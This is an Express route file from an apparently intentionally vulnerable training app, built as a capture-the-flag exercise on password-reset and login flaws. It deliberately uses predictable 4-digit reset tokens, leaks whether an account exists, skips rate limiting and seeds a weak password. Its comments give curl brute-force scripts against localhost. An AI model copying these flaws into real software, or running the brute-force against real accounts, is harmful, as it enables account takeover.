import express from "express";
import { requireAuth } from "../middleware/requireAuth.js";
import { VULN_MODES } from "../config/vulnModes.js";
import { FLAG_REGISTRY } from "../config/flags.js";
import ResetToken from "../models/ResetToken.js";
import { auth } from "../auth.js";
import { fromNodeHeaders } from "better-auth/node";
import mongoose from "mongoose";

const router = express.Router();

// ──────────────────────────────────────────────────────────────────────────────
// A06 — Insecure Design: Predictable Password Reset Tokens (CWE-330)
// ──────────────────────────────────────────────────────────────────────────────

/**
 * Shared counter for sequential token generation — intentionally global/simple.
 *
 * VULNERABILITY: tokens are short (4-digit) sequential integers.
 * A real implementation must use crypto.randomBytes(32).toString('hex').
 */
let tokenCounter = 1000; // starts at 1000 each server restart — predictable

/**
 * POST /api/auth-ext/reset-request
 *
 * VULNERABILITY (A06 — Insecure Design, CWE-330):
 * Generates a predictable 4-digit sequential token stored in plaintext.
 * No rate-limiting. Space is 0000–9999 (effectively 1000–9999 here).
 *
 * Exploit: call this endpoint for the target email, then brute-force
 * /api/auth-ext/reset-verify with tokens starting from ~1000.
 *
 * Fix: use crypto.randomBytes(32), expire after 5 min, add rate limiting.
 */
router.post("/reset-request", async (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.status(400).json({ error: "email is required" });
    }

    // Look up user via Better Auth's underlying collection
    const db = mongoose.connection.db;
    const user = await db.collection("user").findOne({ email });

    if (!user) {
      // Intentional information leak: tells attacker the email doesn't exist.
      // A secure impl would always return 200 to prevent user enumeration.
      return res.status(404).json({ error: "No account found with that email" });
    }

    let token;
    if (VULN_MODES.INSECURE_DESIGN === "patched") {
      // Patched: cryptographically random token
      const { randomBytes } = await import("crypto");
      token = randomBytes(32).toString("hex");
    } else {
      // VULNERABLE: predictable sequential integer in 4-digit range
      token = tokenCounter++;
      if (tokenCounter > 9999) tokenCounter = 1000; // wrap
    }

    // Remove any existing token for this email
    await ResetToken.deleteMany({ email });

    await ResetToken.create({ email, token });

    // In a real app, this would be emailed. We "log" it for demo purposes.
    console.log(`[RESET TOKEN] email=${email} token=${token}`);

    return res.json({
      message: "If that email exists, a reset token has been sent.",
      // INTENTIONAL LEAK in vulnerable mode — makes the brute-force scenario clear for players
      ...(VULN_MODES.INSECURE_DESIGN === "vulnerable" && {
        debug: `Token sent to ${email}. Token space: 1000-9999.`,
      }),
    });
  } catch (err) {
    console.error("Reset request error:", err);
    return res.status(500).json({ error: "Failed to process reset request" });
  }
});

/**
 * POST /api/auth-ext/reset-verify
 *
 * VULNERABILITY (A06 — Insecure Design, CWE-330 + CWE-307):
 * No rate limiting. Accepts the short sequential token.
 * On success for the seeded target account, returns the A06 flag.
 *
 * Brute-force script example:
 *   for i in $(seq 1000 9999); do
 *     curl -s -X POST http://localhost:5000/api/auth-ext/reset-verify \
 *       -H "Content-Type: application/json" \
 *       -d "{\"email\":\"victim@deskwise.local\",\"token\":$i,\"newPassword\":\"hacked\"}" \
 *       | grep -q "success" && echo "Token: $i" && break
 *   done
 */
router.post("/reset-verify", async (req, res) => {
  try {
    const { email, token, newPassword } = req.body;

    if (!email || token === undefined || !newPassword) {
      return res.status(400).json({ error: "email, token, and newPassword are required" });
    }

    const record = await ResetToken.findOne({ email });

    if (!record) {
      return res.status(400).json({ success: false, message: "No active reset token for this email" });
    }

    // Compare — loose equality intentional for vuln demo (string vs number coercion)
    // eslint-disable-next-line eqeqeq
    if (record.token != token) {
      return res.status(400).json({ success: false, message: "Invalid token" });
    }

    // Token matched — update password via Better Auth's internal collection
    const db = mongoose.connection.db;
    const { createHash } = await import("crypto");
    // Note: we use Better Auth's bcrypt — this part is secure
    // In a full integration you'd call auth.api.updatePassword; for demo we
    // update the account record directly
    const account = await db.collection("account").findOne({
      providerId: "credential",
      accountId: email,
    });

    if (account) {
      // Use Better Auth's password field name
      const { hashPassword } = await import("better-auth/crypto");
      const hashed = await hashPassword(newPassword);
      await db.collection("account").updateOne(
        { _id: account._id },
        { $set: { password: hashed } }
      );
    }

    await ResetToken.deleteOne({ email });

    const response = {
      success: true,
      message: "Password reset successful.",
    };

    // Return flag if this is the seeded target account
    if (email === "victim@deskwise.local") {
      const { flag, name } = FLAG_REGISTRY.INSECURE_DESIGN;
      response.flag = flag;
      response.vuln = name;
    }

    return res.json(response);
  } catch (err) {
    console.error("Reset verify error:", err);
    return res.status(500).json({ error: "Failed to verify token" });
  }
});

// ──────────────────────────────────────────────────────────────────────────────
// A07 — Authentication Failures: No Rate Limiting on Login (CWE-307)
// ──────────────────────────────────────────────────────────────────────────────

/**
 * POST /api/auth-ext/login
 *
 * VULNERABILITY (A07 — Authentication Failures, CWE-307 + CWE-521):
 * This login wrapper has ZERO rate limiting. Combined with a seeded account
 * that uses the weak, common password "password123", a credential-stuffing
 * or brute-force script can trivially authenticate as that user.
 *
 * On successful login as the seeded weak-password account (weakuser@deskwise.local),
 * the response includes the A07 flag.
 *
 * Exploit:
 *   curl -X POST http://localhost:5000/api/auth-ext/login \
 *     -H "Content-Type: application/json" \
 *     -d '{"email":"weakuser@deskwise.local","password":"password123"}'
 *
 * Fix (VULN_MODES.AUTH_FAIL = "patched"): add express-rate-limit middleware
 * on this route and enforce strong password policies at registration.
 */
router.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "email and password are required" });
    }

    // Delegate actual authentication to Better Auth
    const result = await auth.api.signInEmail({
      body: { email, password },
      headers: fromNodeHeaders(req.headers),
    });

    if (!result) {
      return res.status(401).json({ success: false, message: "Invalid credentials" });
    }

    const response = {
      success: true,
      user: result.user,
      token: result.token,
    };

    // A07 flag: only returned for the seeded weak-password account
    if (email === "weakuser@deskwise.local") {
      const { flag, name } = FLAG_REGISTRY.AUTH_FAIL;
      response.flag = flag;
      response.vuln = name;
      response.note =
        "This account uses a weak, common password with no rate-limiting protection.";
    }

    return res.json(response);
  } catch (err) {
    // Better Auth throws on bad credentials
    return res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

export default router;
